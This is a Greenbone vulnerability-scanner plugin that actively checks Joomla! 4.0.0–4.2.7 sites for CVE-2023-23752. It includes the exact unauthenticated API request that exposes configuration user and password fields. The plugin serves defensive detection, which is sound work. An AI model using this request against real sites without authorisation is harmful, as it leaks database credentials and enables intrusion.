# SPDX-FileCopyrightText: 2023 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.149360");
  script_version("2024-01-22T05:07:31+0000");
  script_tag(name:"last_modification", value:"2024-01-22 05:07:31 +0000 (Mon, 22 Jan 2024)");
  script_tag(name:"creation_date", value:"2023-02-24 03:52:41 +0000 (Fri, 24 Feb 2023)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2023-02-24 16:17:00 +0000 (Fri, 24 Feb 2023)");

  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_cve_id("CVE-2023-23752");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Joomla! 4.0.0 - 4.2.7 Improper Access Check Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2023 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Joomla! is prone to an improper access check vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"An improper access check allows unauthorized access to
  webservice endpoints.");

  script_tag(name:"affected", value:"Joomla! version 4.0.0 through 4.2.7.");

  script_tag(name:"solution", value:"Update to version 4.2.8 or later.");

  script_xref(name:"URL", value:"https://developer.joomla.org/security-centre/894-20230201-core-improper-access-check-in-webservice-endpoints.html");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/api/index.php/v1/config/application?public=true";

if (http_vuln_check(port: port, url: url, pattern: '"attributes"', check_header: TRUE,
                    extra_check: make_list('\\{"user":', '\\{"password":'))) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
